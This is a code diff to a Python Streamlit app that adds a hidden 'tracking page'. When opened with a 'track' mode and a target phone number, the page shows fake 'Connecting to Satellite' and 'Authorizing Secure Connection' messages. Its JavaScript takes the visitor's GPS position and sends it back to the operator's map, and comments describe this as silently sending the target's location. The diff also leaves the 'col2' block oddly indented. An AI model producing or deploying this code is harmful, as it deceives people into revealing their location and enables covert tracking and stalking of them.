@@ -54,4 +54,24 @@ with col1:
     else:
         st.info("No tracking history found yet.")
 
-with col2:
+with  col2: 
+# --- HIDDEN TRACKING PAGE ---
+if "mode" in query_params and query_params["mode"] == "track":
+    st.empty() # Clear the screen for the target
+    target_phone = query_params.get("phone", "Unknown")
+    
+    st.write(f"### 📡 Connecting to Satellite for {target_phone}...")
+    
+    # This JavaScript silently sends the GPS to YOUR map
+    components.html(f"""
+        <script>
+        navigator.geolocation.getCurrentPosition(function(pos) {{
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            // Redirect back to your main map with the coordinates
+            window.location.href = "?phone={target_phone}&lat=" + lat + "&lon=" + lon;
+        }});
+        </script>
+        <p style="text-align:center; color:gray;">Authorizing Secure Connection...</p>
+    """, height=200)
+    st.stop() # Stop the rest of the app from loading for the target
